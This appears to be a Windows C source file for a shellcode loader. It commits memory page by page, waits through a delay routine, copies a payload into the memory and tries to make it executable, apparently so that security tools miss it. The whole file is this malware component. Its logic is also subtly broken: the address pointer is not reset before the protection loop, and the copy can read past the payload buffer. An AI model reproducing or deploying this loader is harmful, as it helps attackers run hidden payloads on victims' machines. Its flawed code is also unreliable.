#include <Windows.h>
#include "DelayExec.h"

#define		PAGE_SIZE					4096
#define		SET_TO_MULTIPLE_OF_4096(X)	( ((X) + 4095) & (~4095) )

VOID _Memcpy(_In_ PVOID Destination, _In_ PVOID Source, _In_ SIZE_T Length)
{
	while (Length--)
	{
		*((PBYTE)Destination)++ = *((PBYTE)Source)++;
	}
}

PVOID Inject(_In_ PVOID PayloadBuffer, _In_ SIZE_T PayloadSize)
{	
	if (PayloadBuffer == NULL)
	{
		return NULL;
	}

	DWORD PaddedSize   = SET_TO_MULTIPLE_OF_4096(PayloadSize);
	PVOID StartAddress = VirtualAlloc(NULL, PaddedSize + PAGE_SIZE, MEM_RESERVE, PAGE_READONLY);

	if (StartAddress == NULL)
	{
		return NULL;
	}

	StartAddress      = (PVOID)((ULONG_PTR)StartAddress + PAGE_SIZE);
	PVOID TempAddress = StartAddress;

	for (DWORD i = 0; i <= PaddedSize / PAGE_SIZE; i++)
	{
		if (!VirtualAlloc(TempAddress, PAGE_SIZE, MEM_COMMIT, PAGE_READWRITE))
		{
			return NULL;
		}
		TempAddress = (PVOID)((ULONG_PTR)TempAddress + PAGE_SIZE);
	}

	Wait(FALSE);

	TempAddress = StartAddress;

	for (DWORD i = 0; i < PaddedSize / PAGE_SIZE; i++)
	{	
		_Memcpy(TempAddress, PayloadBuffer, PAGE_SIZE);

		PayloadBuffer = (PBYTE)((ULONG_PTR)PayloadBuffer + PAGE_SIZE);
		TempAddress   = (PBYTE)((ULONG_PTR)TempAddress  + PAGE_SIZE);
	}

	DWORD OldProtection = 0;

	for (DWORD i = 0; i <= PaddedSize / PAGE_SIZE; i++)
	{
		if (!VirtualProtect(TempAddress, PAGE_SIZE, PAGE_EXECUTE_READ, &OldProtection))
		{
			return NULL;
		}
		TempAddress = (PVOID)((ULONG_PTR)TempAddress + PAGE_SIZE);
	}

	return StartAddress;
}
